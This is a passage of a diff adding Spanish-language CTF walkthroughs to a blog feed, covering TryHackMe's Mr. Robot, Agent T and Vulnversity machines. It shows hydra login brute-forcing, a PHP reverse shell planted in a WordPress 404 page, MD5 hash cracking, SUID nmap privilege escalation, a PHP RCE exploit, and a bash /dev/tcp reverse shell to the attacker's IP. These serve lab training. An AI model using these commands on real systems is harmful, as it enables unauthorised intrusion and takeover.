+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ hydra -L fsocity.dic -p test 10.10.193.138 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:Invalid username&amp;quot; -t 30
+
+[80][http-post-form] host: 10.10.193.138   login: Elliot   password: test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos un usuario (&lt;code&gt;Elliot&lt;/code&gt;), ahora con hydra también vamos a probar contraseñas con el dicionario rockyou.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ hydra -l Elliot -P fsocity.dic 10.10.33.39 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:The password you entered for the username Elliot is incorrect&amp;quot; -t 30
+
+[80][http-post-form] host: 10.10.193.138   login: Elliot   password: ER28-0652
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con estas credenciales ya podemos iniciar session en la web, eso nos lleva al panel de administración de la web&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel.png&#34;
+	width=&#34;1885&#34;
+	height=&#34;863&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/panel_hue682a41fbe104edbe4c2b0a6a195332e_63822_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;218&#34;
+		data-flex-basis=&#34;524px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora el objetivo seria encontrar algún sitio en el que poder subir archivos, para mandar un php malicioso que nos envié una reverse shell&lt;/p&gt;
+&lt;p&gt;En el apartado de posts podemos subir o escribir archivos pero se quedan en texto plano&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts.png&#34;
+	width=&#34;1230&#34;
+	height=&#34;657&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/posts_hu46e5db3da9cc99a45767f9e849fe2838_33256_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;449px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;En el media podemos subir archivos.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media.png&#34;
+	width=&#34;503&#34;
+	height=&#34;297&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/media_hu2c2653a909d3ecf4211f35a7a87fecc5_77232_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Pero después de comprobarlo con el burpsuite como en la maquina Vulnversity solo acepta archivos con extensiones de fotos.&lt;/p&gt;
+&lt;p&gt;Dentro del apartado de apariencia, en el editor podemos ver que salen los archivos php de la web, los cuales podemos editar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor.png&#34;
+	width=&#34;251&#34;
+	height=&#34;751&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/editor_hud2130b854e8897936150d0db001ca20e_34698_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;33&#34;
+		data-flex-basis=&#34;80px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Por ejemplo vamos a abrir el 404.php y vamos a sustituir lo que había por el código de la reverse shell, es importante cambiar el puerto por el que nos ponemos en escucha y la ip de nuestra maquina&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404.png&#34;
+	width=&#34;824&#34;
+	height=&#34;750&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-mr.robot/images/404_hu0a82ca82a0dd064b141918fe3e1c9afd_73951_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora al poner un subdirectorio random &lt;code&gt;http://10.10.193.138/okjihogyklasd&lt;/code&gt; ejecuta el 404.php y recibimos la conexión.&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;En el directorio &lt;code&gt;/home/robot&lt;/code&gt; esta la segunda flag, también hay un archivo con un hash raw-md5&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+censored password (?)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora al intentar convertirnos en robot sale este error&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ su robot
+su: must be run from a terminal
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con &lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt; se soluciona el problema&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;daemon@linux:/$ python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+daemon@linux:/$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con &lt;code&gt;find / -perm -4000 -exec ls -ldb {} \; 2&amp;gt;/dev/null&lt;/code&gt;, ay un que no deveria de estar ahi, &lt;code&gt;nmap&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap --interactive
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Eso abre el nmap en modo interactive, como se esta ejecutando como root, si hacemos !sh para spawnear una sh, ya somos root, podemos ver la ultima flag en &lt;code&gt;/root&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Agent T</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-agent-t/</link>
+        <pubDate>Mon, 19 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-agent-t/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-agent-t/images/1.jpg" alt="Featured image of post Resolución Agent T" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/agentt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/agentt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.175.238&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.175.238
+PING 10.10.175.238 (10.10.175.238) 56(84) bytes of data.
+64 bytes from 10.10.175.238: icmp_seq=1 ttl=63 time=47.7 ms
+
+--- 10.10.175.238 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 47.680/47.680/47.680/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.175.238 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.175.238
+   5   │     [*] Open ports: 80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p80 -sC -sV 10.10.175.238 -oN target
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+|_http-title:  Admin Dashboard
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;p&gt;Con searchsploit podemos comprobar si la version de php es vulnerable&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ searchsploit PHP 8.1.0-dev
+
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution     | php/webapps/49933.py
+-------------------------------------------------------- ---------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hay un exploit de remote code execution, con &lt;code&gt;searchsploit -m 49933&lt;/code&gt; nos lo podemos pasar a nuestra máquina.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;❯ python3 49933.py
+Enter the full host url:
+http://10.10.175.238
+
+Interactive shell is opened on http://10.10.175.238 
+Can&#39;t acces tty; job crontol turned off.
+$ whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos una shell interactiva como root, pero no podemos salir del directorio &lt;code&gt;/var/www/html&lt;/code&gt;, vamos a intentar crear una reverse shell.&lt;/p&gt;
+&lt;p&gt;Nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Intentamos mandarnos la reverse shell con &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&lt;/code&gt;, pero no recibimos nada, probamos con &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; ahora si, ya podemos ver la flag que está en &lt;code&gt;/flag.txt&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Walkthrough Vulnversity</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/</link>
+        <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/1.jpg" alt="Featured image of post Resolución Walkthrough Vulnversity" /&gt;&lt;p&gt;Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/vulnversity&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/vulnversity&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.23.174&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para la fase de Reconocimiento vamos a usar nmap.&lt;/p&gt;
+&lt;p&gt;¿Qué es nmap?&lt;/p&gt;
+&lt;p&gt;nmap es una herramienta potente, gratuita y de código abierto que se utiliza para descubrir hosts y servicios en una red informática. En nuestro ejemplo, usamos nmap para escanear esta máquina e identificar todos los servicios que se ejecutan en un puerto en particular. nmap tiene muchas capacidades, a continuación hay una tabla que resume algunas de las funciones que proporciona.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed.png&#34;
+	width=&#34;512&#34;
+	height=&#34;512&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-walkthrough-vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;nmap&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;100&#34;
+		data-flex-basis=&#34;240px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Parámetros típicos nmap:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-p&amp;rsquo;port&#39;&lt;/td&gt;
+&lt;td&gt;Escanear unos puertos en específico&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-oG archivo&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado archivo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;escanea-la-máquina-cuántos-puertos-están-abiertos&#34;&gt;Escanea la máquina, ¿cuántos puertos están abiertos?&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- 10.10.23.174
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3128/tcp open  squid-http
+3333/tcp open  dec-notes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tiene un total de 6 puertos abiertos&lt;/p&gt;
+&lt;h3 id=&#34;qué-versión-del-proxy-se-está-ejecutando-en-la-máquina&#34;&gt;¿Qué versión del proxy se está ejecutando en la máquina?&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En el puerto 3128 se puede ver la version de la proxy &lt;code&gt;3.5.12&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400&#34;&gt;¿Cuántos puertos escaneará nmap si se usó la bandera -p-400?&lt;/h3&gt;
+&lt;p&gt;Como se indica en el parámetro (-p-400), Escaneara 400 puertos&lt;/p&gt;
+&lt;h3 id=&#34;usando-el-indicador-nmap--n-qué-no-resolverá&#34;&gt;Usando el indicador nmap -n, ¿qué no resolverá?&lt;/h3&gt;
+&lt;p&gt;Con él &lt;code&gt;-n&lt;/code&gt; no hacer DNS&lt;/p&gt;
+&lt;h3 id=&#34;cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina&#34;&gt;¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina?&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En el puerto 3333 indica que es un Ubuntu&lt;/p&gt;
+&lt;h3 id=&#34;en-qué-puerto-se-está-ejecutando-el-servidor-web&#34;&gt;¿En qué puerto se está ejecutando el servidor web?&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,139,445,3128,3333 -sV 10.10.23.174
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El servidor web se está ejecutando por el puerto 3333&lt;/p&gt;
+&lt;h2 id=&#34;localizando-subdirectorios&#34;&gt;Localizando subdirectorios&lt;/h2&gt;
+&lt;p&gt;Para esta parte vamos a buscar directorios con &lt;code&gt;gobuster&lt;/code&gt; y &lt;code&gt;wfuzz&lt;/code&gt; usando el diccionario &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga&#34;&gt;¿Cuál es el directorio que tiene una página de formulario de carga?&lt;/h3&gt;
+&lt;h4 id=&#34;gobuster&#34;&gt;GoBuster&lt;/h4&gt;
+&lt;p&gt;GoBuster es una herramienta utilizada para la fuerza bruta de URI (directorios y archivos), subdominios DNS y nombres de host virtual. Para esta máquina, nos centraremos en usarla para directorios de fuerza bruta.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-e&lt;/td&gt;
+&lt;td&gt;Imprima las URL completas en su consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-u&lt;/td&gt;
+&lt;td&gt;La URL de destino&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Ruta a tu diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-U y -P&lt;/td&gt;
+&lt;td&gt;Nombre de usuario y contraseña para autenticación básica&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-p&amp;rsquo;x&#39;&lt;/td&gt;
+&lt;td&gt;Proxy a utilizar para las solicitudes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-c &amp;lsquo;http cookies&amp;rsquo;&lt;/td&gt;
+&lt;td&gt;Especifique una cookie para simular su autenticación&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ gobuster dir -u http://10.10.23.174:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+2022/12/18 01:37:49 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 320] [--&amp;gt; http://10.10.23.174:3333/images/]
+/css                  (Status: 301) [Size: 317] [--&amp;gt; http://10.10.23.174:3333/css/]
+/js                   (Status: 301) [Size: 316] [--&amp;gt; http://10.10.23.174:3333/js/]
+/fonts                (Status: 301) [Size: 319] [--&amp;gt; http://10.10.23.174:3333/fonts/]
+/internal             (Status: 301) [Size: 322] [--&amp;gt; http://10.10.23.174:3333/internal/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: &lt;code&gt;internal&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;wfuzz&#34;&gt;wfuzz&lt;/h4&gt;
+&lt;p&gt;Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y está basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga útil) definido.&lt;/p&gt;
+&lt;p&gt;Un payload en Wfuzz es una fuente de datos.&lt;/p&gt;
+&lt;p&gt;Este concepto simple permite cualquier entrada sea inyectada en cualquier campo de una petición HTTP, permitiendo realizar ataques complejos de seguridad web en diferentes componentes de la aplicación web, como parámetros, formularios, directorios/archivos, cabeceras, etc.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.reydes.com/d/?q=Fuerza_Bruta_contra_Directorios_utilizando_Wfuzz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Fuente&lt;/a&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+=====================================================================
